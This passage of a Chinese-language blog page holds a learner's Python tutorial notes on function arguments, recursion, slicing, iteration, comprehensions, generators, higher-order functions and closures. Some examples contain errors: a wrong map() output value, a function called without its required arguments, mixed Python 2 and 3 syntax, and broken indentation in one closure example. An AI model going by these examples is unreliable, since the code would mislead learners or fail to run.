class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(x, y, step, angle = <span class="number">0</span>)</span>:</span></span><br><span class="line">    nx = x + step * math.cos(angle)</span><br><span class="line">    ny = y - step * math.sin(angle)</span><br><span class="line">    <span class="keyword">return</span> nx, ny</span><br><span class="line"></span><br><span class="line">nx, ny = move() <span class="comment"># 接收多个返回值</span></span><br><span class="line">r = move(<span class="number">100</span>, <span class="number">100</span>, <span class="number">60</span>, math.pi / <span class="number">6</span>)</span><br><span class="line">print(r)</span><br><span class="line">(<span class="number">151.96152422706632</span>, <span class="number">70.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值</span></span><br><span class="line"><span class="comment"># 所以函数返回的就是一个tuple，但写起来很方便</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数执行完毕后也没有 return 语句时，将自动 return none</span></span><br></pre></td></tr></table></figure><ul><li>可变参数————*</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  定义默认参数要牢记一点：默认参数必须指向不变对象！并且放在后面</span></span><br><span class="line"><span class="comment"># 定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个*号。</span></span><br><span class="line"><span class="comment"># 在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。</span></span><br><span class="line"><span class="comment"># 但是，调用该函数时，可以传入任意个参数，包括0个参数：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(*numbers)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum += n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line">calc(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">calc(<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">25</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用起来是不是很舒服呀？</span></span><br><span class="line"><span class="comment"># 相当于省略了创建 tuple、list 的过程，一步到位</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已经有一个list或tuple，要调用可变参数怎么办，可以这样做</span></span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">calc(nums[<span class="number">0</span>], nums[<span class="number">1</span>], nums[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显然如此处理太繁琐，办法来了:</span></span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">calc(*nums)</span><br></pre></td></tr></table></figure><ul><li>关键字参数————**</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关键字参数允许你传入0个或任意个含参数名的参数，这些关键字在函数内部自动组装为一个 dict</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, **kw)</span>:</span></span><br><span class="line">    print(<span class="string">'name:'</span>, name, <span class="string">'age:'</span>, age, <span class="string">'other:'</span>, kw)</span><br><span class="line"></span><br><span class="line">person(<span class="string">'Michael'</span>, <span class="number">30</span>)  <span class="comment"># name: Michael age: 30 other: &#123;&#125;</span></span><br><span class="line">person(<span class="string">'Michael'</span>, <span class="number">30</span>,city=<span class="string">'Beijing'</span>)  <span class="comment"># name: Michael age: 30 other: &#123;'city': 'Beijing'&#125;</span></span><br><span class="line"><span class="comment"># 关键字参数可以扩展函数的功能。比如在person函数中既可以接收必要的参数，但是，</span></span><br><span class="line"><span class="comment"># 如果调用者愿意提供更多的参数，我们也能收到。</span></span><br><span class="line"><span class="comment"># 试想，你正在做一个用户注册的功能，除了用户名和年龄是必选项，其他都是可选项，</span></span><br><span class="line"><span class="comment"># 利用关键字参数来定义这个函数就能满足注册的需求</span></span><br><span class="line"></span><br><span class="line">extra = &#123;<span class="string">'city'</span>: <span class="string">'Beijing'</span>, <span class="string">'job'</span>: <span class="string">'Engineer'</span>&#125;</span><br><span class="line">person(<span class="string">'Jack'</span>, <span class="number">24</span>, **extra)</span><br><span class="line"><span class="comment"># name: Jack age: 24 other: &#123;'city': 'Beijing', 'job': 'Engineer'&#125;</span></span><br></pre></td></tr></table></figure><ul><li>命名关键字参数</li><li>参数组合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Python中定义函数，可以用必选参数、默认参数、可变参数、关键词参数和命名关键词参数，这5中参数都可以组合使用。</span></span><br><span class="line"><span class="comment"># 但参数定义的顺序必须是：必选、默认、可变、命名关键字、关键字</span></span><br></pre></td></tr></table></figure><ul><li>递归函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fact(n<span class="number">-1</span>)*n</span><br><span class="line"></span><br><span class="line">print(fact(<span class="number">99</span>))</span><br><span class="line"></span><br><span class="line">尾递归优化</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fac</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> fact_iter(n, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact_iter</span><span class="params">(num, product)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> product</span><br><span class="line">    <span class="keyword">return</span> fact_iter(num - <span class="number">1</span>, num * product)</span><br><span class="line"><span class="comment"># 优点：如果做了优化，栈不会增长，无论调用多少次也不会栈溢出</span></span><br><span class="line"><span class="comment"># 尾递归和循环是等价的，没有循环语句的编程语言只能通过尾递归实现循环</span></span><br><span class="line"><span class="comment"># 然而，注意是然而，Python标准的解释器没有针对尾递归做优化，任何递归函数都存在栈溢出问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的汉诺塔</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(n,a,b,c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        print(a, <span class="string">'--&gt;'</span>, c)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    move(n<span class="number">-1</span>, a, c, b)</span><br><span class="line">    print(a, <span class="string">'--&gt;'</span>, c)</span><br><span class="line">    move(n<span class="number">-1</span>, b, a, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># move(3, 'A', 'B', 'C')</span></span><br></pre></td></tr></table></figure><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切片————[a ：b]，索引从a取到b（不包括b）</span></span><br><span class="line">L = [<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>, <span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</span><br><span class="line">print(L[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从0开始时可以省略(索引从0开始)</span></span><br><span class="line">print(L[:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 倒着取</span></span><br><span class="line">print(L[<span class="number">-2</span>:])  <span class="comment"># 从L[-2]到结尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历整个list或tuple</span></span><br><span class="line">print(L[:])</span><br><span class="line"></span><br><span class="line">L = list(range(<span class="number">100</span>))</span><br><span class="line">L[:<span class="number">10</span>]  <span class="comment"># 前10个数</span></span><br><span class="line">L[<span class="number">-10</span>:]  <span class="comment"># 后10个数</span></span><br><span class="line">L[<span class="number">10</span>:<span class="number">20</span>]  <span class="comment"># 前11~20个数</span></span><br><span class="line">L[:<span class="number">10</span>:<span class="number">2</span>]  <span class="comment"># 前10个数，每两个取1个</span></span><br><span class="line">L[::<span class="number">5</span>]  <span class="comment"># 所有数，每5个取一个</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用切片操作，实现一个trim()函数，去除字符串首尾的空格</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trim</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">elif</span> s[<span class="number">0</span>] == <span class="string">' '</span>:</span><br><span class="line">        <span class="keyword">return</span> trim(s[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">elif</span> s[<span class="number">-1</span>] == <span class="string">' '</span>:</span><br><span class="line">        <span class="keyword">return</span> trim(s[:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="comment"># 这个思路真的很棒，谢谢原作者</span></span><br></pre></td></tr></table></figure><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 迭代永远是取出元素本身，而非元素的索引</span></span><br><span class="line"><span class="comment"># 如果给定一个list或tuple，我们可以通过for循环来遍历这个结构，这种遍历叫做迭代（iteration）</span></span><br><span class="line"></span><br><span class="line">例题：在迭代 [<span class="string">'Adam'</span>, <span class="string">'Lisa'</span>, <span class="string">'Bart'</span>, <span class="string">'Paul'</span>] 时，</span><br><span class="line"> 如果我们想打印出名次 - 名字（名次从<span class="number">1</span>开始)，请考虑如何在迭代中打印出来。</span><br><span class="line">zip()函数可以把两个list变成一个list</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zip([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>], [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>])</span><br><span class="line">[(<span class="number">10</span>, <span class="string">'A'</span>), (<span class="number">20</span>, <span class="string">'B'</span>), (<span class="number">30</span>, <span class="string">'C'</span>)]</span><br><span class="line"></span><br><span class="line">L = [<span class="string">'Adam'</span>, <span class="string">'Lisa'</span>, <span class="string">'Bart'</span>, <span class="string">'Paul'</span>]</span><br><span class="line"><span class="keyword">for</span> index, name <span class="keyword">in</span> zip(range(<span class="number">1</span>, len(L)+<span class="number">1</span>), L):</span><br><span class="line">    <span class="keyword">print</span> index, <span class="string">'-'</span>, name</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python的for循环抽象程度是要高于c的，因为Python的for循环不仅可以用在list或tuple上，</span></span><br><span class="line"><span class="comment"># 还可以作用在其他的迭代对象上。只要是可迭代对象，无论有无下标，均可迭代，比如dict</span></span><br><span class="line">d = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    print(key)</span><br><span class="line"><span class="comment"># dict的存储不是按照 list 的方式顺序排列，每次的迭代的顺序可能不一样</span></span><br><span class="line"><span class="comment"># 默认情况下，dict 迭代的是 key</span></span><br><span class="line"><span class="comment"># 如果要迭代value</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> d.values():</span><br><span class="line">    print(value)</span><br><span class="line">py3中抛弃了itervalues方法</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果要同时迭代 key 和 value</span></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> d.items():<span class="comment"># items()返回的是包含tuple的list</span></span><br><span class="line">    print(<span class="string">'k = '</span>, k, <span class="string">', v = '</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串也是可迭代对象</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">'ABC'</span>:</span><br><span class="line">    print(ch)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 那如何判断对象是否可迭代呢？</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line">print(isinstance(<span class="string">'abc'</span>, Iterable))</span><br><span class="line">print(isinstance([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], Iterable))</span><br><span class="line">print(isinstance(<span class="number">123</span>, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果对list实现类似Java那样的下标循环怎么办？</span></span><br><span class="line"><span class="comment"># enumerate()函数来救场,它可以把list变成索引——元素对</span></span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]):</span><br><span class="line">    print(i, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">9</span>)]:</span><br><span class="line">    print(x, y)</span><br></pre></td></tr></table></figure><h3 id="列表生成器"><a href="#列表生成器" class="headerlink" title="列表生成器"></a>列表生成器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成[1, 2, 3, 4....]</span></span><br><span class="line">list(range(<span class="number">1</span>,<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成[1*1, 2*2, 3*3, 4*4....]</span></span><br><span class="line"><span class="comment"># 使用循环</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    L.append(x * x)</span><br><span class="line"><span class="comment"># 过于繁琐</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表生成器一句话搞定</span></span><br><span class="line">L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</span><br><span class="line">print(L)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for循环后面还可以加上if判断</span></span><br><span class="line">L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以使用两层循环，生成全排列</span></span><br><span class="line">L = [m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</span><br><span class="line">print(L)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运用列表生成器可以写出非常简洁的代码</span></span><br><span class="line"><span class="comment"># 例如，列出当前目录下的所有文件和目录名</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">L = [d <span class="keyword">for</span> d <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>)]</span><br><span class="line">print(L)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将list中的所有字符串变成小写</span></span><br><span class="line">L = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="string">'IBM'</span>, <span class="string">'Apple'</span>]</span><br><span class="line">H = [s.lower() <span class="keyword">for</span> s <span class="keyword">in</span> L]</span><br><span class="line">print(H)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for循环可以同时使用多个变量，因此，列表生成器也可以使用两个变量来生成list</span></span><br><span class="line">d = &#123;<span class="string">'x'</span>: <span class="string">'A'</span>, <span class="string">'y'</span>: <span class="string">'B'</span>, <span class="string">'z'</span>: <span class="string">'C'</span> &#125;</span><br><span class="line">L = [k + <span class="string">'='</span> + v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.items()]</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><h3 id="生成器-generator"><a href="#生成器-generator" class="headerlink" title="生成器(generator)"></a>生成器(generator)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？</span></span><br><span class="line"><span class="comment"># 这样就不必创建完整的list，从而节省大量的空间。</span></span><br><span class="line"><span class="comment"># 在Python中，这种一边循环一边计算的机制，称为生成器：generator</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一：将列表生成器的 [] 改成 ()</span></span><br><span class="line">L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line">g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">print(g)  </span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x00000221BDA5CC00</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过next()获得生成器的下一个值</span></span><br><span class="line"><span class="comment"># 因为generator也是可迭代对象，那就可以直接使用 for 循环</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> g:</span><br><span class="line">    print(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：使用 yield</span></span><br><span class="line"><span class="comment"># 如果函数定义中包含了 yield 关键字，</span></span><br><span class="line"><span class="comment"># 那这个函数就不再是一个普通函数，</span></span><br><span class="line"><span class="comment"># 而是一个 generator</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 斐波那契数列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    i, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        print(b)</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">fib(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级为生成器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    i, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">b = fib(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><ul><li>把计算视为函数而非指令</li><li>纯函数式编程：不需要变量，没有副作用，测试简单</li><li>支持高阶函数，代码简洁</li></ul><h4 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h4><p>将函数作为参数传入函数</p><h5 id="map"><a href="#map" class="headerlink" title="map()"></a><em>map()</em></h5><p>把函数依次作用在 list 的<code>每个元素</code>上，得到一个<code>新的list</code>并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="comment"># 如果把list的每个元素都平方，就可以用map()函数：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x*x</span><br><span class="line"><span class="keyword">print</span> map(f, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br></pre></td></tr></table></figure><h5 id="reduce"><a href="#reduce" class="headerlink" title="reduce()"></a><em>reduce()</em></h5><h5 id="filter"><a href="#filter" class="headerlink" title="filter()"></a><em>filter()</em></h5><p>挑出符合条件的元素</p><h5 id="sorted"><a href="#sorted" class="headerlink" title="sorted()"></a><em>sorted()</em></h5><p>能自定义比较规则的sort()?</p><h4 id="返回函数"><a href="#返回函数" class="headerlink" title="返回函数"></a>返回函数</h4><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><p>嵌套定义函数，内层函数引用了外层函数的局部变量，然后返回内层函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一般形式：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'g()...'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'f()...'</span></span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭包大法后：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'f()...'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'g()...'</span></span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">将g()挪到函数内部，防止其他代码调用g()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 坑点：确保引用的局部变量在函数返回后不能变</span></span><br><span class="line"><span class="comment"># 希望一次返回3个函数，分别计算1X1,2X2，3X3：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">            <span class="keyword">return</span> i * i</span><br><span class="line">        fs.append(f)</span><br><span class="line">   <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br><span class="line"><span class="comment"># 结局是f1, f2, f3 全是9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确写法：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(j)</span>:</span></span><br><span class="line">            <span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">                <span class="keyword">return</span> j * 